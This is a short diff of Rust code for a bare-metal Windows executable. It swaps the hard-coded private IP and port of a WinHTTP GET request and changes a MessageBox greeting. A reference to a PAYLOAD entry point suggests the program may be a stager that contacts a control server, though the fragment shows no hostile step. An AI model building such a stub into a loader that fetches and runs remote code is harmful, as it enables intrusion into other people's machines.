@@ -139,7 +139,7 @@ fn encode_utf16_heap(s: &str) -> &'static mut [u16] {
 #[unsafe(no_mangle)]
 pub extern "system" fn mainCRTStartup() -> i32 {
     let method = encode_utf16_heap("GET");
-    let ip_or_domain = encode_utf16_heap("10.111.16.10");
+    let ip_or_domain = encode_utf16_heap("192.168.8.37");
     let entry_id = core::ptr::addr_of!(PAYLOAD.0) as *const u16;
     unsafe{
 
@@ -158,7 +158,7 @@ pub extern "system" fn mainCRTStartup() -> i32 {
         let h_connect = WinHttpConnect(
             h_session,
             ip_or_domain.as_ptr(), //ip or domain
-            8092 as u16, // port
+            8081 as u16, // port
             0
         );
         
@@ -182,8 +182,8 @@ pub extern "system" fn mainCRTStartup() -> i32 {
             0
         );
         
-        let text = encode_utf16_heap("愚人节快乐！");
-        let caption = encode_utf16_heap("节日祝福");
+        let text = encode_utf16_heap("运行成功，嘿嘿！");
+        let caption = encode_utf16_heap("烈火战车");
         MessageBoxW(
             core::ptr::null_mut(),
             text.as_ptr(),
